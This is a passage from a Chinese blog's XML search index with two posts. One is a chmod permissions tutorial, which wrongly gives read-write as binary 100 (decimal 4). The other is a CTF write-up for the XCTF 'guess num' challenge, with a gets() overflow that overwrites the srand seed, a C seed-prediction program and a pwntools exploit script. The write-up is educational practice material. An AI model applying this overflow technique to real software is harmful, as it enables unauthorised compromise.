    </entry>
    
    
    
    <entry>
      <title>ELF执行权限</title>
      <link href="/2020/04/23/elf-zhi-xing-quan-xian/"/>
      <url>/2020/04/23/elf-zhi-xing-quan-xian/</url>
      
        <content type="html"><![CDATA[<p>使用chmod命令：<br>chmod用于管理文件或目录的权限，文件或目录权限的控制分别以读取(r)、写入(w)、执行(x)3种<br>可读可写可执行，抽象的用二进制来表示 1 代表拥有该权限，0 代表没有该权限，这样我们就可以看到<br>具有全部权限二进制可理解为  “111”  即 十进制的 “7”，只有读写权限二进制可理解为  “100”  即 十进制的 “4”</p><p>用法：chmod [选项] [文件..]</p><p>权限范围<br>u,User　　　   即文件或目录的拥有者<br>g,Group　　　即文件或目录的所属群组<br>o,Other　　　 除了文件或目录拥有者或所属群组之外，其他用户皆属于这个范围<br>a,All　　　　   即全部的用户，包含拥有者，所属群组以及其他用户<br>r　　　　　　 读取权限，数字代号为“4” 即 “100”<br>w　　　　　　写入权限，数字代号为“2” 即 “010”<br>x　　　　　　 执行或切换权限，数字代号为“1” 即 “001”<br>-　　　　　　 不具任何权限，数字代号为“0” 即 “000”</p><p>&lt;权限范围&gt;+&lt;权限&gt;　　       　　  增加指定权限 (chmod u+r file)<br>&lt;权限范围&gt;-&lt;权限&gt;　　  　　　　删除指定权限 (chmod g-rw file)<br>&lt;权限范围&gt;=&lt;权限&gt;　　　　　　 等于指定权限 (chmod o=rwx file)</p><p>例子：<br><img src="https://s1.ax1x.com/2020/05/23/YjqWND.png" alt=""></p><p>将suanfa文件增加可执行</p>]]></content>
      
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xctf-gusnum</title>
      <link href="/2020/03/23/xctf-gusnum/"/>
      <url>/2020/03/23/xctf-gusnum/</url>
      
        <content type="html"><![CDATA[<p>1: file<br><img src="https://s1.ax1x.com/2020/05/23/YjOiQA.png" alt="64位"><br>2: checksec<br><img src="https://s1.ax1x.com/2020/05/23/YjOCzd.png" alt="保护全开"><br>3: 运行<br><img src="https://s1.ax1x.com/2020/05/23/YjLxIO.png" alt=""><br>4: ida伪代码<br><img src="https://s1.ax1x.com/2020/05/23/YjOpJe.png" alt=""><br>在用rand（）函数产生随机数时一般用srand（）初始化种子（seed）<br>rand函数调用<br>rand()函数每次调用前都会查询是否调用过srand(seed)，是否给seed设定了一个值，如果有那么它会自动调用srand(seed)一次来初始化它的起始值<br>若之前没有调用srand（seed），那么系统会自动给seed赋初始值，即srand（1）自动调用它一次</p><p>rand（）产生随机数时，如果用srand（seed）播下种子之后，一旦种子相同（下面的getpid方法），产生的随机数将是相同的。当然很多时候刻意让rand（）产生的随机数随机化，用时间作种子 srand（time（NULL）），这样每次运行程序的时间肯定是不相同的，产生的随机数肯定就不一样了。</p><p>从上面伪代码的解析可知：关键在于10次循环，每一次输入的值v4得等于随机数v6（1~6之间）就可以进入sub_C3E函数得到flag</p><p>gets函数：的v7：<br><img src="https://s1.ax1x.com/2020/05/23/YjLvdK.png" alt=""></p><p>可知v7大小0x30-0x10=0x20,下面就是seed这个sedd大小我没从stack中看出，在伪代码中定义的seed是unsigned int seed[2];<br> 大小为8个字节。<br>伪代码中srand用的是seed[0]所以如果能将seed[0]覆盖为以知就可以再写一个程序来得到rand的随机数（在linux中写）<br>得到随机数就能进入目标函数</p><p>尝试：<br>用0x20个字符填满v7后面加上0000，记住gets是将输入做当字符串，所以0000填满了seed[0]后因为seed是int型数据，里面的字符串以ASCII码存入会被直接解释为int数据即：0000的ASCII为0x30303030<br>所以seed的值为0x30303030，所以我们的代码seed值就是0x30303030：<br>#include&lt;stdio.h&gt;<br>#include&lt;stdlib.h&gt;</p><p>int main()<br>{<br>        srand(0x30303030);<br>        int i;<br>        for(i=0;i&lt;=9;i++){<br>                printf(“%d\n”,rand()%6 + 1);<br>        }</p><pre><code>    return 0;</code></pre><p>}<br>结果：</p><p><img src="https://s1.ax1x.com/2020/05/23/YjOSiD.png" alt=""></p><p>所以我们payload = “A”*0x20 + “0000”:<br><img src="https://s1.ax1x.com/2020/05/23/YjO9RH.png" alt=""></p><p>确实如此！！！！</p><p>写exp：<br>rom pwn import*</p><p>context.log_level = ‘debug’</p><p>sh = remote(“<strong>*”,*</strong>)</p><p>sh.recv()</p><p>payload = “A”*0x20 + “0000”</p><p>sh.sendline(payload)</p><p>sh.recv()</p><p>num = [“6”,”5”,”1”,”4”,”3”,”1”,”1”,”4”,”3”,”1”]</p><p>for i in range(10):<br>        sh.sendline(num[i])<br>        sh.recv()</p><p>本地测试：<br><img src="https://s1.ax1x.com/2020/05/23/YjOFsI.png" alt=""></p>]]></content>
      
      
      
        <tags>
            
            <tag> xctf-pwn-easy </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
